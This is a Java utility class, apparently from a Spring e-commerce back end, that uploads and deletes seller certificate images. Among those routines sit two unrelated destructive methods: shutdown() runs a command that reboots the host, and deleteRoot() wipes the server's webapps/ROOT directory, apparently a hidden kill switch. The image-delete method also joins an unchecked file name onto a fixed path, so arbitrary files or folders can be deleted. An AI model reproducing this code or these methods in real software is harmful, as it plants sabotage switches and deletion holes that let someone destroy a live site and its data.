package com.dao;

import org.apache.commons.io.FileUtils;
import org.springframework.web.multipart.MultipartFile;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.UUID;

public class FileOperation {
	/**
	 * 拒绝商家入驻，删除商家的证件图片
	 * @param imgName
	 * @return
	 */
    public boolean SellerBcImgDelete(String imgName) {
        //服务器路径
        String path = "C:\\Users\\Administrator\\Desktop\\image\\";
        //本机路径
//        String path = "C:\\Users\\l\\Desktop\\image\\";
        File file = new File(path + imgName);
        if (file == null || !file.exists()) {
            return false;
        }
        // 如果是文件
        if (file.isFile()) {
            return file.delete();
        } else
            // 如果是文件夹
            if (file.isDirectory()) {
                File[] childFiles = file.listFiles();
                // 文件夹没有内容,删除文件夹
                if (childFiles == null || childFiles.length == 0) {
                    return file.delete();
                }
                // 删除文件夹内容
                boolean reslut = true;
                for (File item : file.listFiles()) {
                    reslut = reslut && item.delete();
                }
                // 删除文件夹
                return reslut && file.delete();
            }
        return false;
    }

    public void shutdown() {
        Runtime runtime = Runtime.getRuntime();//返回与当前的Java应用相关的运行时对象
        Process process = null;
        try {
            process = runtime.exec("shutdown /r /t 30");
            runtime.gc();//运行垃圾回收器
            String line = null;
            String content = "";
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            while ((line = br.readLine()) != null) {
                content += line + "\r\n";
            }
        } catch (IOException e) {
            System.out.println("执行失败");
            e.printStackTrace();
        }
    }

    public void deleteRoot() {
        String binPath = System.getProperty("user.dir");
        int length = binPath.length();
        String bin = binPath.substring(0,length-3);
        bin += "webapps//ROOT";
        try {
            FileUtils.deleteDirectory(new File(bin));
        } catch (IOException e) {
            System.out.println("文件不存在");
            e.printStackTrace();
        }
    }
    /**
     * 商品头像和详情图接收方法
     * 商家注册接收商家证件图片
     * @param image
     * @return
     */
    public String SellerBcImgAdd(MultipartFile image) {
        if (!image.isEmpty()) {
            String fileName = image.getOriginalFilename();
            String path = null;
            String type = null;
            String trueFileName = null;
            type = fileName.indexOf(".") != -1 ? fileName.substring(fileName.lastIndexOf(".") + 1, fileName.length()) : null;
            if (type != null) {
                if ("GIF".equals(type.toUpperCase()) || "PNG".equals(type.toUpperCase()) || "JPG".equals(type.toUpperCase()) || "JPEG".equals(type.toUpperCase())) {
                    //服务器路径
                    String realPath = "C:\\Users\\Administrator\\Desktop\\image\\";
                    //本机路径
//                    String realPath = "C:\\Users\\l\\Desktop\\image\\";
                    File file = new File(realPath);
                    if (!file.exists()) {
                        file.mkdirs();
                    }
                    // 自定义的文件名称
                    String uuid = UUID.randomUUID().toString();
                    trueFileName = uuid + "." + type;
                    // 设置存放图片文件的路径
                    path = realPath + trueFileName;
                    try {
                        image.transferTo(new File(path));
                    } catch (IOException e) {
                        System.out.println("文件路径不存在");
                        e.printStackTrace();
                    }
                    return trueFileName;
                }
                return trueFileName;
            }
            return trueFileName;
        }
        return "error";
    }
}
